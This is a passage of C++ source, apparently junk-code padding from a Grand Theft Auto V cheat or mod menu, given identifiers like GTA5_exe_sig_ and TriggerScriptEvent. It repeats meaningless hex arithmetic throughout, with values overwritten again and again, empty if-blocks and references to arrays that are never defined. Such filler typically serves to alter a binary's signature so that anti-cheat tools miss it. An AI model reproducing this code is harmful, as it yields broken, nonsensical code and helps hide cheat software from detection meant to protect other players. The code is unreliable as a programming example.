				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<AudioFile volume=\"400\" /> ");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
